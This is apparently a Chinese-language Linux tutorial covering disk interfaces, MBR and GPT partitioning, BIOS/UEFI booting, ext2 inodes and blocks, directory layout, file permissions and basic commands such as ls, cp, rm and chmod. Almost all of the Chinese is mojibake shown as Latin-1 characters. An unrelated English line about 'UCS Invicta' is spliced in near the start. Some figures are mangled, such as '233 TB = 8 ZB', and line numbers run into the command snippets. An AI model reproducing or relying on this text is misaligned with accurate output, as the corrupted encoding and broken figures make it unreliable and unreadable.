åˆ¶åŠ¨æ‰‹è‡‚ï¼ˆActuator armï¼‰ï¼šç”¨äºåœ¨ç£é“ä¹‹é—´ç§»åŠ¨ç£å¤´ï¼› ä¸»è½´ï¼ˆSpindleï¼‰ï¼šä½¿æ•´ä¸ªç›˜é¢è½¬åŠ¨ã€‚ Decoding UCS Invicta â€“ Part 1 ç£ç›˜æ¥å£1. IDEIDEï¼ˆATAï¼‰å…¨ç§° Advanced Technology Attachmentï¼Œæ¥å£é€Ÿåº¦æœ€å¤§ä¸º 133MB/sï¼Œå› ä¸ºå¹¶å£çº¿çš„æŠ—å¹²æ‰°æ€§å¤ªå·®ï¼Œä¸”æ’çº¿å ç”¨ç©ºé—´è¾ƒå¤§ï¼Œä¸åˆ©ç”µè„‘å†…éƒ¨æ•£çƒ­ï¼Œå·²é€æ¸è¢« SATA æ‰€å–ä»£ã€‚ 2. SATASATA å…¨ç§° Serial ATAï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨ä¸²å£çš„ ATA æ¥å£ï¼Œå› æŠ—å¹²æ‰°æ€§å¼ºï¼Œä¸”å¯¹æ•°æ®çº¿çš„é•¿åº¦è¦æ±‚æ¯” ATA ä½å¾ˆå¤šï¼Œæ”¯æŒçƒ­æ’æ‹”ç­‰åŠŸèƒ½ï¼ŒSATA-II çš„æ¥å£é€Ÿåº¦ä¸º 300MiB/sï¼Œè€Œæ–°çš„ SATA-III æ ‡å‡†å¯è¾¾åˆ° 600MiB/s çš„ä¼ è¾“é€Ÿåº¦ã€‚SATA çš„æ•°æ®çº¿ä¹Ÿæ¯” ATA çš„ç»†å¾—å¤šï¼Œæœ‰åˆ©äºæœºç®±å†…çš„ç©ºæ°”æµé€šï¼Œæ•´ç†çº¿æä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ã€‚ 3. SCSISCSI å…¨ç§°æ˜¯ Small Computer System Interfaceï¼ˆå°å‹æœºç³»ç»Ÿæ¥å£ï¼‰ï¼Œç»å†å¤šä»£çš„å‘å±•ï¼Œä»æ—©æœŸçš„ SCSI-IIï¼Œåˆ°ç›®å‰çš„ Ultra320 SCSI ä»¥åŠ Fiber-Channelï¼ˆå…‰çº¤é€šé“ï¼‰ï¼Œæ¥å£å‹å¼ä¹Ÿå¤šç§å¤šæ ·ã€‚SCSI ç¡¬ç›˜å¹¿ä¸ºå·¥ä½œç«™çº§ä¸ªäººç”µè„‘ä»¥åŠæœåŠ¡å™¨æ‰€ä½¿ç”¨ï¼Œå› æ­¤ä¼šä½¿ç”¨è¾ƒä¸ºå…ˆè¿›çš„æŠ€æœ¯ï¼Œå¦‚ç¢Ÿç‰‡è½¬é€Ÿ 15000rpm çš„é«˜è½¬é€Ÿï¼Œä¸”èµ„æ–™ä¼ è¾“æ—¶ CPU å ç”¨ç‡è¾ƒä½ï¼Œä½†æ˜¯å•ä»·ä¹Ÿæ¯”ç›¸åŒå®¹é‡çš„ ATA åŠ SATA ç¡¬ç›˜æ›´åŠ æ˜‚è´µã€‚ 4. SASSASï¼ˆSerial Attached SCSIï¼‰æ˜¯æ–°ä¸€ä»£çš„ SCSI æŠ€æœ¯ï¼Œå’Œ SATA ç¡¬ç›˜ç›¸åŒï¼Œéƒ½æ˜¯é‡‡å–åºåˆ—å¼æŠ€æœ¯ä»¥è·å¾—æ›´é«˜çš„ä¼ è¾“é€Ÿåº¦ï¼Œå¯è¾¾åˆ° 6Gb/sã€‚æ­¤å¤–ä¹Ÿé€è¿‡ç¼©å°è¿æ¥çº¿æ”¹å–„ç³»ç»Ÿå†…éƒ¨ç©ºé—´ç­‰ã€‚ ç£ç›˜çš„æ–‡ä»¶åLinux ä¸­æ¯ä¸ªç¡¬ä»¶éƒ½è¢«å½“åšä¸€ä¸ªæ–‡ä»¶ï¼ŒåŒ…æ‹¬ç£ç›˜ã€‚ç£ç›˜ä»¥ç£ç›˜æ¥å£ç±»å‹è¿›è¡Œå‘½åï¼Œå¸¸è§ç£ç›˜çš„æ–‡ä»¶åå¦‚ä¸‹ï¼š IDE ç£ç›˜ï¼š/dev/hd[a-d] SATA/SCSI/SAS ç£ç›˜ï¼š/dev/sd[a-p] å…¶ä¸­æ–‡ä»¶ååé¢çš„åºå·çš„ç¡®å®šä¸ç³»ç»Ÿæ£€æµ‹åˆ°ç£ç›˜çš„é¡ºåºæœ‰å…³ï¼Œè€Œä¸ç£ç›˜æ‰€æ’å…¥çš„æ’æ§½ä½ç½®æ— å…³ã€‚ ä¸‰ã€åˆ†åŒºåˆ†åŒºè¡¨ç£ç›˜åˆ†åŒºè¡¨ä¸»è¦æœ‰ä¸¤ç§æ ¼å¼ï¼Œä¸€ç§æ˜¯é™åˆ¶è¾ƒå¤šçš„ MBR åˆ†åŒºè¡¨ï¼Œä¸€ç§æ˜¯è¾ƒæ–°ä¸”é™åˆ¶è¾ƒå°‘çš„ GPT åˆ†åŒºè¡¨ã€‚ 1. MBRMBR ä¸­ï¼Œç¬¬ä¸€ä¸ªæ‰‡åŒºæœ€é‡è¦ï¼Œé‡Œé¢æœ‰ä¸»è¦å¼€æœºè®°å½•ï¼ˆMaster boot record, MBRï¼‰åŠåˆ†åŒºè¡¨ï¼ˆpartition tableï¼‰ï¼Œå…¶ä¸­ä¸»è¦å¼€æœºè®°å½•å  446 bytesï¼Œåˆ†åŒºè¡¨å  64 bytesã€‚ åˆ†åŒºè¡¨åªæœ‰ 64 bytesï¼Œæœ€å¤šåªèƒ½å­˜å‚¨ 4 ä¸ªåˆ†åŒºï¼Œè¿™ 4 ä¸ªåˆ†åŒºä¸ºä¸»åˆ†åŒºï¼ˆPrimaryï¼‰å’Œæ‰©å±•åˆ†åŒºï¼ˆExtendedï¼‰ã€‚å…¶ä¸­æ‰©å±•åˆ†åŒºåªæœ‰ä¸€ä¸ªï¼Œå®ƒå°†å…¶å®ƒæ‰‡åŒºç”¨æ¥è®°å½•åˆ†åŒºè¡¨ï¼Œå› æ­¤é€šè¿‡æ‰©å±•åˆ†åŒºå¯ä»¥åˆ†å‡ºæ›´å¤šåˆ†åŒºï¼Œè¿™äº›åˆ†åŒºç§°ä¸ºé€»è¾‘åˆ†åŒºã€‚ Linux ä¹ŸæŠŠåˆ†åŒºå½“æˆæ–‡ä»¶ï¼Œåˆ†åŒºæ–‡ä»¶çš„å‘½åæ–¹å¼ä¸ºï¼šç£ç›˜æ–‡ä»¶å + ç¼–å·ï¼Œä¾‹å¦‚ /dev/sda1ã€‚æ³¨æ„ï¼Œé€»è¾‘åˆ†åŒºçš„ç¼–å·ä» 5 å¼€å§‹ã€‚ 2. GPTä¸åŒçš„ç£ç›˜æœ‰ä¸åŒçš„æ‰‡åŒºå¤§å°ï¼Œä¾‹å¦‚ 512 bytes å’Œæœ€æ–°ç£ç›˜çš„ 4 kã€‚GPT ä¸ºäº†å…¼å®¹æ‰€æœ‰ç£ç›˜ï¼Œåœ¨å®šä¹‰æ‰‡åŒºä¸Šä½¿ç”¨é€»è¾‘åŒºå—åœ°å€ï¼ˆLogical Block Address, LBAï¼‰ï¼ŒLBA é»˜è®¤å¤§å°ä¸º 512 bytesã€‚ GPT ç¬¬ 1 ä¸ªåŒºå—è®°å½•äº†ä¸»è¦å¼€æœºè®°å½•ï¼ˆMBRï¼‰ï¼Œç´§æ¥ç€æ˜¯ 33 ä¸ªåŒºå—è®°å½•åˆ†åŒºä¿¡æ¯ï¼Œå¹¶æŠŠæœ€åçš„ 33 ä¸ªåŒºå—ç”¨äºå¯¹åˆ†åŒºä¿¡æ¯è¿›è¡Œå¤‡ä»½ã€‚è¿™ 33 ä¸ªåŒºå—ç¬¬ä¸€ä¸ªä¸º GPT è¡¨å¤´çºªå½•ï¼Œè¿™ä¸ªéƒ¨ä»½çºªå½•äº†åˆ†åŒºè¡¨æœ¬èº«çš„ä½ç½®ä¸å¤§å°å’Œå¤‡ä»½åˆ†åŒºçš„ä½ç½®ï¼ŒåŒæ—¶æ”¾ç½®äº†åˆ†åŒºè¡¨çš„æ ¡éªŒç  (CRC32)ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥æ ¹æ®è¿™ä¸ªæ ¡éªŒç æ¥åˆ¤æ–­ GPT æ˜¯å¦æ­£ç¡®ã€‚è‹¥æœ‰é”™è¯¯ï¼Œå¯ä»¥ä½¿ç”¨å¤‡ä»½åˆ†åŒºè¿›è¡Œæ¢å¤ã€‚ GPT æ²¡æœ‰æ‰©å±•åˆ†åŒºæ¦‚å¿µï¼Œéƒ½æ˜¯ä¸»åˆ†åŒºï¼Œæ¯ä¸ª LAB å¯ä»¥åˆ† 4 ä¸ªåˆ†åŒºï¼Œå› æ­¤æ€»å…±å¯ä»¥åˆ† 4 * 32 = 128 ä¸ªåˆ†åŒºã€‚ MBR ä¸æ”¯æŒ 2.2 TB ä»¥ä¸Šçš„ç¡¬ç›˜ï¼ŒGPT åˆ™æœ€å¤šæ”¯æŒåˆ° 233 TB = 8 ZBã€‚ å¼€æœºæ£€æµ‹ç¨‹åº1. BIOSBIOSï¼ˆBasic Input/Output Systemï¼ŒåŸºæœ¬è¾“å…¥è¾“å‡ºç³»ç»Ÿï¼‰ï¼Œå®ƒæ˜¯ä¸€ä¸ªå›ºä»¶ï¼ˆåµŒå…¥åœ¨ç¡¬ä»¶ä¸­çš„è½¯ä»¶ï¼‰ï¼ŒBIOS ç¨‹åºå­˜æ”¾åœ¨æ–­ç”µåå†…å®¹ä¸ä¼šä¸¢å¤±çš„åªè¯»å†…å­˜ä¸­ã€‚ BIOS æ˜¯å¼€æœºçš„æ—¶å€™è®¡ç®—æœºæ‰§è¡Œçš„ç¬¬ä¸€ä¸ªç¨‹åºï¼Œè¿™ä¸ªç¨‹åºçŸ¥é“å¯ä»¥å¼€æœºçš„ç£ç›˜ï¼Œå¹¶è¯»å–ç£ç›˜ç¬¬ä¸€ä¸ªæ‰‡åŒºçš„ä¸»è¦å¼€æœºè®°å½•ï¼ˆMBRï¼‰ï¼Œç”±ä¸»è¦å¼€æœºè®°å½•ï¼ˆMBRï¼‰æ‰§è¡Œå…¶ä¸­çš„å¼€æœºç®¡ç†ç¨‹åºï¼Œè¿™ä¸ªå¼€æœºç®¡ç†ç¨‹åºä¼šåŠ è½½æ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒæ–‡ä»¶ã€‚ ä¸»è¦å¼€æœºè®°å½•ï¼ˆMBRï¼‰ä¸­çš„å¼€æœºç®¡ç†ç¨‹åºæä¾›ä»¥ä¸‹åŠŸèƒ½ï¼šé€‰å•ã€è½½å…¥æ ¸å¿ƒæ–‡ä»¶ä»¥åŠè½¬äº¤å…¶å®ƒå¼€æœºç®¡ç†ç¨‹åºã€‚è½¬äº¤è¿™ä¸ªåŠŸèƒ½å¯ä»¥ç”¨æ¥å®ç°äº†å¤šé‡å¼•å¯¼ï¼Œåªéœ€è¦å°†å¦ä¸€ä¸ªæ“ä½œç³»ç»Ÿçš„å¼€æœºç®¡ç†ç¨‹åºå®‰è£…åœ¨å…¶å®ƒåˆ†åŒºçš„å¯åŠ¨æ‰‡åŒºä¸Šï¼Œåœ¨å¯åŠ¨å¼€æœºç®¡ç†ç¨‹åºæ—¶ï¼Œå°±å¯ä»¥é€šè¿‡é€‰å•é€‰æ‹©å¯åŠ¨å½“å‰çš„æ“ä½œç³»ç»Ÿæˆ–è€…è½¬äº¤ç»™å…¶å®ƒå¼€æœºç®¡ç†ç¨‹åºä»è€Œå¯åŠ¨å¦ä¸€ä¸ªæ“ä½œç³»ç»Ÿã€‚ ä¸‹å›¾ä¸­ï¼Œç¬¬ä¸€æ‰‡åŒºçš„ä¸»è¦å¼€æœºè®°å½•ï¼ˆMBRï¼‰ä¸­çš„å¼€æœºç®¡ç†ç¨‹åºæä¾›äº†ä¸¤ä¸ªé€‰å•ï¼šM1ã€M2ï¼ŒM1 æŒ‡å‘äº† Windows æ“ä½œç³»ç»Ÿï¼Œè€Œ M2 æŒ‡å‘å…¶å®ƒåˆ†åŒºçš„å¯åŠ¨æ‰‡åŒºï¼Œé‡Œé¢åŒ…å«äº†å¦å¤–ä¸€ä¸ªå¼€æœºç®¡ç†ç¨‹åºï¼Œæä¾›äº†ä¸€ä¸ªæŒ‡å‘ Linux çš„é€‰å•ã€‚ å®‰è£…å¤šé‡å¼•å¯¼ï¼Œæœ€å¥½å…ˆå®‰è£… Windows å†å®‰è£… Linuxã€‚å› ä¸ºå®‰è£… Windows æ—¶ä¼šè¦†ç›–æ‰ä¸»è¦å¼€æœºè®°å½•ï¼ˆMBRï¼‰ï¼Œè€Œ Linux å¯ä»¥é€‰æ‹©å°†å¼€æœºç®¡ç†ç¨‹åºå®‰è£…åœ¨ä¸»è¦å¼€æœºè®°å½•ï¼ˆMBRï¼‰æˆ–è€…å…¶å®ƒåˆ†åŒºçš„å¯åŠ¨æ‰‡åŒºï¼Œå¹¶ä¸”å¯ä»¥è®¾ç½®å¼€æœºç®¡ç†ç¨‹åºçš„é€‰å•ã€‚ 2. UEFIBIOS ä¸å¯ä»¥è¯»å– GPT åˆ†åŒºè¡¨ï¼Œè€Œ UEFI å¯ä»¥ã€‚ å››ã€æ–‡ä»¶ç³»ç»Ÿåˆ†åŒºä¸æ–‡ä»¶ç³»ç»Ÿå¯¹åˆ†åŒºè¿›è¡Œæ ¼å¼åŒ–æ˜¯ä¸ºäº†åœ¨åˆ†åŒºä¸Šå»ºç«‹æ–‡ä»¶ç³»ç»Ÿã€‚ä¸€ä¸ªåˆ†åŒºé€šå¸¸åªèƒ½æ ¼å¼åŒ–ä¸ºä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä½†æ˜¯ç£ç›˜é˜µåˆ—ç­‰æŠ€æœ¯å¯ä»¥å°†ä¸€ä¸ªåˆ†åŒºæ ¼å¼åŒ–ä¸ºå¤šä¸ªæ–‡ä»¶ç³»ç»Ÿã€‚ ç»„æˆ æœ€ä¸»è¦çš„å‡ ä¸ªç»„æˆéƒ¨åˆ†å¦‚ä¸‹ï¼š inodeï¼šä¸€ä¸ªæ–‡ä»¶å ç”¨ä¸€ä¸ª inodeï¼Œè®°å½•æ–‡ä»¶çš„å±æ€§ï¼ŒåŒæ—¶è®°å½•æ­¤æ–‡ä»¶çš„å†…å®¹æ‰€åœ¨çš„ block ç¼–å·ï¼› blockï¼šè®°å½•æ–‡ä»¶çš„å†…å®¹ï¼Œæ–‡ä»¶å¤ªå¤§æ—¶ï¼Œä¼šå ç”¨å¤šä¸ª blockã€‚ é™¤æ­¤ä¹‹å¤–è¿˜åŒ…æ‹¬ï¼š superblockï¼šè®°å½•æ–‡ä»¶ç³»ç»Ÿçš„æ•´ä½“ä¿¡æ¯ï¼ŒåŒ…æ‹¬ inode å’Œ block çš„æ€»é‡ã€ä½¿ç”¨é‡ã€å‰©ä½™é‡ï¼Œä»¥åŠæ–‡ä»¶ç³»ç»Ÿçš„æ ¼å¼ä¸ç›¸å…³ä¿¡æ¯ç­‰ï¼› block bitmapï¼šè®°å½• block æ˜¯å¦è¢«ä½¿ç”¨çš„ä½åŸŸï¼› æ–‡ä»¶è¯»å–å¯¹äº Ext2 æ–‡ä»¶ç³»ç»Ÿï¼Œå½“è¦è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹æ—¶ï¼Œå…ˆåœ¨ inode ä¸­å»æŸ¥æ‰¾æ–‡ä»¶å†…å®¹æ‰€åœ¨çš„æ‰€æœ‰ blockï¼Œç„¶åæŠŠæ‰€æœ‰ block çš„å†…å®¹è¯»å‡ºæ¥ã€‚ è€Œå¯¹äº FAT æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒæ²¡æœ‰ inodeï¼Œæ¯ä¸ª block ä¸­å­˜å‚¨ç€ä¸‹ä¸€ä¸ª block çš„ç¼–å·ã€‚ ç£ç›˜ç¢ç‰‡æŒ‡ä¸€ä¸ªæ–‡ä»¶å†…å®¹æ‰€åœ¨çš„ block è¿‡äºåˆ†æ•£ã€‚ blockåœ¨ Ext2 æ–‡ä»¶ç³»ç»Ÿä¸­æ‰€æ”¯æŒçš„ block å¤§å°æœ‰ 1Kï¼Œ2K åŠ 4K ä¸‰ç§ï¼Œä¸åŒçš„å¤§å°é™åˆ¶äº†å•ä¸ªæ–‡ä»¶å’Œæ–‡ä»¶ç³»ç»Ÿçš„æœ€å¤§å¤§å°ã€‚ å¤§å° 1KB 2KB 4KB æœ€å¤§å•ä¸€æ–‡ä»¶ 16GB 256GB 2TB æœ€å¤§æ–‡ä»¶ç³»ç»Ÿ 2TB 8TB 16TB ä¸€ä¸ª block åªèƒ½è¢«ä¸€ä¸ªæ–‡ä»¶æ‰€ä½¿ç”¨ï¼Œæœªä½¿ç”¨çš„éƒ¨åˆ†ç›´æ¥æµªè´¹äº†ã€‚å› æ­¤å¦‚æœéœ€è¦å­˜å‚¨å¤§é‡çš„å°æ–‡ä»¶ï¼Œé‚£ä¹ˆæœ€å¥½é€‰ç”¨æ¯”è¾ƒå°çš„ blockã€‚ inodeinode å…·ä½“åŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼š æƒé™ (read/write/excute)ï¼› æ‹¥æœ‰è€…ä¸ç¾¤ç»„ (owner/group)ï¼› å®¹é‡ï¼› å»ºç«‹æˆ–çŠ¶æ€æ”¹å˜çš„æ—¶é—´ (ctime)ï¼› æœ€è¿‘ä¸€æ¬¡çš„è¯»å–æ—¶é—´ (atime)ï¼› æœ€è¿‘ä¿®æ”¹çš„æ—¶é—´ (mtime)ï¼› å®šä¹‰æ–‡ä»¶ç‰¹æ€§çš„æ——æ ‡ (flag)ï¼Œå¦‚ SetUIDâ€¦ï¼› è¯¥æ–‡ä»¶çœŸæ­£å†…å®¹çš„æŒ‡å‘ (pointer)ã€‚ inode å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š æ¯ä¸ª inode å¤§å°å‡å›ºå®šä¸º 128 bytes (æ–°çš„ ext4 ä¸ xfs å¯è®¾å®šåˆ° 256 bytes)ï¼› æ¯ä¸ªæ–‡ä»¶éƒ½ä»…ä¼šå ç”¨ä¸€ä¸ª inodeã€‚ inode ä¸­è®°å½•äº†æ–‡ä»¶å†…å®¹æ‰€åœ¨çš„ block ç¼–å·ï¼Œä½†æ˜¯æ¯ä¸ª block éå¸¸å°ï¼Œä¸€ä¸ªå¤§æ–‡ä»¶éšä¾¿éƒ½éœ€è¦å‡ åä¸‡çš„ blockã€‚è€Œä¸€ä¸ª inode å¤§å°æœ‰é™ï¼Œæ— æ³•ç›´æ¥å¼•ç”¨è¿™ä¹ˆå¤š block ç¼–å·ã€‚å› æ­¤å¼•å…¥äº†é—´æ¥ã€åŒé—´æ¥ã€ä¸‰é—´æ¥å¼•ç”¨ã€‚é—´æ¥å¼•ç”¨æ˜¯æŒ‡ï¼Œè®© inode è®°å½•çš„å¼•ç”¨ block å—è®°å½•å¼•ç”¨ä¿¡æ¯ã€‚ ç›®å½•å»ºç«‹ä¸€ä¸ªç›®å½•æ—¶ï¼Œä¼šåˆ†é…ä¸€ä¸ª inode ä¸è‡³å°‘ä¸€ä¸ª blockã€‚block è®°å½•çš„å†…å®¹æ˜¯ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„ inode ç¼–å·ä»¥åŠæ–‡ä»¶åã€‚å¯ä»¥çœ‹å‡ºæ–‡ä»¶çš„ inode æœ¬èº«ä¸è®°å½•æ–‡ä»¶åï¼Œæ–‡ä»¶åè®°å½•åœ¨ç›®å½•ä¸­ï¼Œå› æ­¤æ–°å¢æ–‡ä»¶ã€åˆ é™¤æ–‡ä»¶ã€æ›´æ”¹æ–‡ä»¶åè¿™äº›æ“ä½œä¸ç›®å½•çš„ w æƒé™æœ‰å…³ã€‚ æ—¥å¿—å¦‚æœçªç„¶æ–­ç”µï¼Œé‚£ä¹ˆæ–‡ä»¶ç³»ç»Ÿä¼šå‘ç”Ÿé”™è¯¯ï¼Œä¾‹å¦‚æ–­ç”µå‰åªä¿®æ”¹äº† block bitmapï¼Œè€Œè¿˜æ²¡æœ‰å°†æ•°æ®çœŸæ­£å†™å…¥ block ä¸­ã€‚ ext3/ext4 æ–‡ä»¶ç³»ç»Ÿå¼•å…¥äº†æ—¥å¿—åŠŸèƒ½ï¼Œå¯ä»¥åˆ©ç”¨æ—¥å¿—æ¥ä¿®å¤æ–‡ä»¶ç³»ç»Ÿã€‚ æŒ‚è½½æŒ‚è½½åˆ©ç”¨ç›®å½•ä½œä¸ºæ–‡ä»¶ç³»ç»Ÿçš„è¿›å…¥ç‚¹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿›å…¥ç›®å½•ä¹‹åå°±å¯ä»¥è¯»å–æ–‡ä»¶ç³»ç»Ÿçš„æ•°æ®ã€‚ ç›®å½•é…ç½®ä¸ºäº†ä½¿ä¸åŒ Linux å‘è¡Œç‰ˆæœ¬çš„ç›®å½•ç»“æ„ä¿æŒä¸€è‡´æ€§ï¼ŒFilesystem Hierarchy Standard (FHS) è§„å®šäº† Linux çš„ç›®å½•ç»“æ„ã€‚æœ€åŸºç¡€çš„ä¸‰ä¸ªç›®å½•å¦‚ä¸‹ï¼š / (root, æ ¹ç›®å½•) /usr (unix software resource)ï¼šæ‰€æœ‰ç³»ç»Ÿé»˜è®¤è½¯ä»¶éƒ½ä¼šå®‰è£…åˆ°è¿™ä¸ªç›®å½•ï¼› /var (variable)ï¼šå­˜æ”¾ç³»ç»Ÿæˆ–ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­çš„æ•°æ®æ–‡ä»¶ã€‚ äº”ã€æ–‡ä»¶æ–‡ä»¶å±æ€§ç”¨æˆ·åˆ†ä¸ºä¸‰ç§ï¼šæ–‡ä»¶æ‹¥æœ‰è€…ã€ç¾¤ç»„ä»¥åŠå…¶å®ƒäººï¼Œå¯¹ä¸åŒçš„ç”¨æˆ·æœ‰ä¸åŒçš„æ–‡ä»¶æƒé™ã€‚ ä½¿ç”¨ ls æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œä¼šæ˜¾ç¤ºä¸€ä¸ªæ–‡ä»¶çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ drwxr-xr-x. 3 root root 17 May 6 00:14 .configï¼Œå¯¹è¿™ä¸ªä¿¡æ¯çš„è§£é‡Šå¦‚ä¸‹ï¼š drwxr-xr-xï¼šæ–‡ä»¶ç±»å‹ä»¥åŠæƒé™ï¼Œç¬¬ 1 ä½ä¸ºæ–‡ä»¶ç±»å‹å­—æ®µï¼Œå 9 ä½ä¸ºæ–‡ä»¶æƒé™å­—æ®µ 3ï¼šé“¾æ¥æ•° rootï¼šæ–‡ä»¶æ‹¥æœ‰è€… rootï¼šæ‰€å±ç¾¤ç»„ 17ï¼šæ–‡ä»¶å¤§å° May 6 00:14ï¼šæ–‡ä»¶æœ€åè¢«ä¿®æ”¹çš„æ—¶é—´ .configï¼šæ–‡ä»¶å å¸¸è§çš„æ–‡ä»¶ç±»å‹åŠå…¶å«ä¹‰æœ‰ï¼š dï¼šç›®å½• -ï¼šæ–‡ä»¶ lï¼šé“¾æ¥æ–‡ä»¶ 9 ä½çš„æ–‡ä»¶æƒé™å­—æ®µä¸­ï¼Œæ¯ 3 ä¸ªä¸ºä¸€ç»„ï¼Œå…± 3 ç»„ï¼Œæ¯ä¸€ç»„åˆ†åˆ«ä»£è¡¨å¯¹æ–‡ä»¶æ‹¥æœ‰è€…ã€æ‰€å±ç¾¤ç»„ä»¥åŠå…¶å®ƒäººçš„æ–‡ä»¶æƒé™ã€‚ä¸€ç»„æƒé™ä¸­çš„ 3 ä½åˆ†åˆ«ä¸º rã€wã€x æƒé™ï¼Œè¡¨ç¤ºå¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œã€‚ æ–‡ä»¶æ—¶é—´æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š modification time (mtime)ï¼šæ–‡ä»¶çš„å†…å®¹æ›´æ–°å°±ä¼šæ›´æ–°ï¼› status time (ctime)ï¼šæ–‡ä»¶çš„çŠ¶æ€ï¼ˆæƒé™ã€å±æ€§ï¼‰æ›´æ–°å°±ä¼šæ›´æ–°ï¼› access time (atime)ï¼šè¯»å–æ–‡ä»¶æ—¶å°±ä¼šæ›´æ–°ã€‚ æ–‡ä»¶ä¸ç›®å½•çš„åŸºæœ¬æ“ä½œ1. lsåˆ—å‡ºæ–‡ä»¶æˆ–è€…ç›®å½•çš„ä¿¡æ¯ï¼Œç›®å½•çš„ä¿¡æ¯å°±æ˜¯å…¶ä¸­åŒ…å«çš„æ–‡ä»¶ã€‚ 1234# ls [-aAdfFhilnrRSt] file|dir-a ï¼šåˆ—å‡ºå…¨éƒ¨çš„æ–‡ä»¶-d ï¼šä»…åˆ—å‡ºç›®å½•æœ¬èº«-l ï¼šä»¥é•¿æ•°æ®ä¸²è¡Œåˆ—å‡ºï¼ŒåŒ…å«æ–‡ä»¶çš„å±æ€§ä¸æƒé™ç­‰ç­‰æ•°æ® 2. cdæ›´æ¢å½“å‰ç›®å½•ã€‚ 1cd [ç›¸å¯¹è·¯å¾„æˆ–ç»å¯¹è·¯å¾„] 3. mkdiråˆ›å»ºç›®å½•ã€‚ 123# mkdir [-mp] ç›®å½•åç§°-m ï¼šé…ç½®ç›®å½•æƒé™-p ï¼šé€’å½’åˆ›å»ºç›®å½• 4. rmdiråˆ é™¤ç›®å½•ï¼Œç›®å½•å¿…é¡»ä¸ºç©ºã€‚ 12rmdir [-p] ç›®å½•åç§°-p ï¼šé€’å½’åˆ é™¤ç›®å½• 5. touchæ›´æ–°æ–‡ä»¶æ—¶é—´æˆ–è€…å»ºç«‹æ–°æ–‡ä»¶ã€‚ 123456# touch [-acdmt] filename-a ï¼š æ›´æ–° atime-c ï¼š æ›´æ–° ctimeï¼Œè‹¥è¯¥æ–‡ä»¶ä¸å­˜åœ¨åˆ™ä¸å»ºç«‹æ–°æ–‡ä»¶-m ï¼š æ›´æ–° mtime-d ï¼š åé¢å¯ä»¥æ¥æ›´æ–°æ—¥æœŸè€Œä¸ä½¿ç”¨å½“å‰æ—¥æœŸï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ --date="æ—¥æœŸæˆ–æ—¶é—´"-t ï¼š åé¢å¯ä»¥æ¥æ›´æ–°æ—¶é—´è€Œä¸ä½¿ç”¨å½“å‰æ—¶é—´ï¼Œæ ¼å¼ä¸º[YYYYMMDDhhmm] 6. cpå¤åˆ¶æ–‡ä»¶ã€‚ å¦‚æœæºæ–‡ä»¶æœ‰ä¸¤ä¸ªä»¥ä¸Šï¼Œåˆ™ç›®çš„æ–‡ä»¶ä¸€å®šè¦æ˜¯ç›®å½•æ‰è¡Œã€‚ 12345678cp [-adfilprsu] source destination-a ï¼šç›¸å½“äº -dr --preserve=all çš„æ„æ€ï¼Œè‡³äº dr è¯·å‚è€ƒä¸‹åˆ—è¯´æ˜-d ï¼šè‹¥æ¥æºæ–‡ä»¶ä¸ºé“¾æ¥æ–‡ä»¶ï¼Œåˆ™å¤åˆ¶é“¾æ¥æ–‡ä»¶å±æ€§è€Œéæ–‡ä»¶æœ¬èº«-i ï¼šè‹¥ç›®æ ‡æ–‡ä»¶å·²ç»å­˜åœ¨æ—¶ï¼Œåœ¨è¦†ç›–å‰ä¼šå…ˆè¯¢é—®-p ï¼šè¿åŒæ–‡ä»¶çš„å±æ€§ä¸€èµ·å¤åˆ¶è¿‡å»-r ï¼šé€’å½’æŒç»­å¤åˆ¶-u ï¼šdestination æ¯” source æ—§æ‰æ›´æ–° destinationï¼Œæˆ– destination ä¸å­˜åœ¨çš„æƒ…å†µä¸‹æ‰å¤åˆ¶--preserve=all ï¼šé™¤äº† -p çš„æƒé™ç›¸å…³å‚æ•°å¤–ï¼Œè¿˜åŠ å…¥ SELinux çš„å±æ€§, links, xattr ç­‰ä¹Ÿå¤åˆ¶äº† 7. rmåˆ é™¤æ–‡ä»¶ã€‚ 12# rm [-fir] æ–‡ä»¶æˆ–ç›®å½•-r ï¼šé€’å½’åˆ é™¤ 8. mvç§»åŠ¨æ–‡ä»¶ã€‚ 123# mv [-fiu] source destination# mv [options] source1 source2 source3 .... directory-f ï¼š force å¼ºåˆ¶çš„æ„æ€ï¼Œå¦‚æœç›®æ ‡æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œä¸ä¼šè¯¢é—®è€Œç›´æ¥è¦†ç›– ä¿®æ”¹æƒé™å¯ä»¥å°†ä¸€ç»„æƒé™ç”¨æ•°å­—æ¥è¡¨ç¤ºï¼Œæ­¤æ—¶ä¸€ç»„æƒé™çš„ 3 ä¸ªä½å½“åšäºŒè¿›åˆ¶æ•°å­—çš„ä½ï¼Œä»å·¦åˆ°å³æ¯ä¸ªä½çš„æƒå€¼ä¸º 4ã€2ã€1ï¼Œå³æ¯ä¸ªæƒé™å¯¹åº”çš„æ•°å­—æƒå€¼ä¸º r : 4ã€w : 2ã€x : 1ã€‚ 1# chmod [-R] xyz dirname/filename ç¤ºä¾‹ï¼šå°† .bashrc æ–‡ä»¶çš„æƒé™ä¿®æ”¹ä¸º -rwxr-xrâ€“ã€‚ 1# chmod 754 .bashrc ä¹Ÿå¯ä»¥ä½¿ç”¨ç¬¦å·æ¥è®¾å®šæƒé™ã€‚ 12345678# chmod [ugoa] [+-=] [rwx] dirname/filename- uï¼šæ‹¥æœ‰è€…- gï¼šæ‰€å±ç¾¤ç»„- oï¼šå…¶ä»–äºº- aï¼šæ‰€æœ‰äºº- +ï¼šæ·»åŠ æƒé™- -ï¼šç§»é™¤æƒé™- =ï¼šè®¾å®šæƒé™ ç¤ºä¾‹ï¼šä¸º .bashrc æ–‡ä»¶çš„æ‰€æœ‰ç”¨æˆ·æ·»åŠ 